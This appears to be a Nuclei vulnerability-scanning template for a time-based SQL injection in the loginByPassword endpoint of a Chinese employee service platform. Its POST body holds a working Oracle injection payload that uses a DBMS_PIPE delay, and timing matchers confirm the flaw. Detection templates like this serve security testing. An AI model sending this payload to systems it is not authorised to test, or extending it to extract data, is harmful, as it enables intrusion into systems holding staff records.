id: hanzhi-loginbypassword-sqli
info:
  name: 翰智员工服务平台 loginByPassword SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    翰智员工服务平台 loginByPassword endpoint is vulnerable to SQL injection, allowing unauthorized access or exploitation.

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - method: POST
    path:
      - /hrssc/portal/plantform/loginByPassword
    headers:
      Content-Type: application/json
    body: |-
      {"userName":"'||(SELECT CHR(97)||CHR(122)||CHR(85)||CHR(72) FROM DUAL WHERE 7673=7673 AND 7374=DBMS_PIPE.RECEIVE_MESSAGE(CHR(82)||CHR(72)||CHR(114)||CHR(99),{{t1}}))||'","password":"'"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"loginSuccess":false'
        negative: false
      - type: word
        words:
          - "<"
        negative: true
      - type: dsl
        dsl:
          - duration > t1
          - duration < t2
